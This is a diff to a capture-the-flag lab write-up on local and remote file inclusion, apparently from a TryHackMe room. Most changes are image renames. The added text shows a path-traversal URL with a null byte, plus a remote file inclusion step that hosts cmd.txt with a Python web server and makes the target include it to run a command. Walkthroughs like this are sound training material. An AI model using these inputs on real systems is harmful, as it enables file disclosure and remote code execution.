@@ -38,7 +38,7 @@ Only worked in browser
 
 hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%00
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>
 
 **Capture Flag1 at /etc/flag1**
 
@@ -56,7 +56,7 @@ hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%0
 
 <figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Capture Flag2 at /etc/flag2**
 
@@ -83,3 +83,29 @@ Page is getting rid of our slashes
 Changing to post and added extra slashed and null character at end.
 
 <figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?**
+
+**Kali**
+
+Created the following file to run the hostname command.
+
+****![](<../../.gitbook/assets/image (14).png>)****
+
+**Kali**
+
+Host the file
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Browser**
+
+```
+hxxp://10.10.230.14/playground.php?file=http://10.10.11.193:81/cmd.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
